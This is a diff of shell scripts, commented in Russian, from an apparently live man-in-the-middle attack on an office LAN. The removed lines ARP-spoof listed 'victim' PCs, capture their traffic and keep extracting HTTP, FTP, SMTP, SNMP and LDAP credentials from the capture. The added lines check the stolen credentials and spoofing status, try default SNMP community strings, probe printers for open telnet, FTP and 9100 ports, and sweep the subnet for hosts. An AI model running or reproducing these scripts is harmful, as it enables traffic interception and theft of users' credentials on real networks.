@@ -1,45 +1,25 @@
-pkill spoof 2>/dev/null
-# Расширяем spoof на ВСЕ живые офисные ПК
-cat > /tmp/spoof2.sh << 'SP'
-#!/bin/sh
-while :; do
-  for V in 192.168.3.135 192.168.3.152 192.168.3.16 192.168.3.76 192.168.3.86 192.168.3.89 192.168.3.126 192.168.3.198; do
-    ping -c1 -W1 $V > /dev/null 2>&1
-    arping -c 1 -A -I enp7s0 -s 192.168.3.1 $V > /dev/null 2>&1
-    arping -c 1 -A -I enp7s0 -s $V 192.168.3.1 > /dev/null 2>&1
+echo "=== CREDS ==="
+cat /tmp/creds_new.txt 2>/dev/null | head -30
+echo "=== MITM LOG ==="
+cat /tmp/mitm_log.txt 2>/dev/null | tail -5
+echo "=== PCAP SIZE ==="
+ls -la /tmp/mitm3.pcap 2>/dev/null | awk '{print $5}'
+echo "=== SPOOF STATUS ==="
+pgrep -c spoof
+echo "=== WS TRAP ==="
+tail -5 /tmp/wstrap.out 2>/dev/null
+echo "=== SNMP скан сетевых устройств ==="
+which snmpwalk || apt-get install -y snmp >/dev/null 2>&1
+for ip in 192.168.3.1 192.168.3.190 192.168.3.105 192.168.3.211; do
+  R=$(timeout 3 snmpwalk -v2c -c public -t 2 -Ov $ip sysName.0 2>/dev/null | head -1)
+  [ -n "$R" ] && echo "$ip SNMP: $R"
+done
+echo "=== ПРИНТЕРЫ (telnet/ftp/9100) ==="
+for ip in 192.168.3.105 192.168.3.211; do
+  for p in 23 21 9100 631 80; do
+    timeout 1 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN"
   done
-  sleep 3
 done
-SP
-chmod +x /tmp/spoof2.sh
-nohup /tmp/spoof2.sh > /dev/null 2>&1 &
-# tcpdump на ВСЕ порты жертв (не только 80)
-pkill tcpdump 2>/dev/null
-nohup tcpdump -i enp7s0 -w /tmp/mitm3.pcap -c 200000 "host 192.168.3.135 or host 192.168.3.152 or host 192.168.3.16 or host 192.168.3.76" > /dev/null 2>&1 &
-echo "=== Экстрактор кредов (каждые 60с) ==="
-cat > /tmp/cred_ext.sh << 'CE'
-#!/bin/sh
-while :; do
-  sleep 60
-  if [ -f /tmp/mitm3.pcap ]; then
-    # HTTP Basic Auth
-    strings /tmp/mitm3.pcap | grep -aE "Authorization: Basic|Authorization: Digest" | sort -u | head -20 > /tmp/creds_new.txt
-    # HTTP POST (login forms)
-    strings /tmp/mitm3.pcap | grep -aE "password=|passwd=|pass=|login=" | sort -u | head -20 >> /tmp/creds_new.txt
-    # FTP
-    strings /tmp/mitm3.pcap | grep -aE "USER |PASS " | sort -u | head -10 >> /tmp/creds_new.txt
-    # SMTP
-    strings /tmp/mitm3.pcap | grep -aE "AUTH|MAIL FROM" | sort -u | head -5 >> /tmp/creds_new.txt
-    # SNMP community
-    strings /tmp/mitm3.pcap | grep -aiE "public|private" | sort -u | head -5 >> /tmp/creds_new.txt
-    # LDAP bind
-    strings /tmp/mitm3.pcap | grep -aE "cn=|uid=" | sort -u | head -10 >> /tmp/creds_new.txt
-    # Итог
-    WC=$(wc -l < /tmp/creds_new.txt 2>/dev/null)
-    [ "$WC" -gt 0 ] && echo "$(date +%H:%M:%S) CREDS: $WC lines" >> /tmp/mitm_log.txt
-  fi
-done
-CE
-chmod +x /tmp/cred_ext.sh
-nohup /tmp/cred_ext.sh > /dev/null 2>&1 &
-echo MITM-V2-ACTIVE
+echo "=== НОВЫЕ ХОСТЫ (кто появился) ==="
+for i in $(seq 100 254); do ping -c1 -W1 192.168.3.$i > /dev/null 2>&1 && echo "$i UP"; done | head -15
+echo ALLCHK
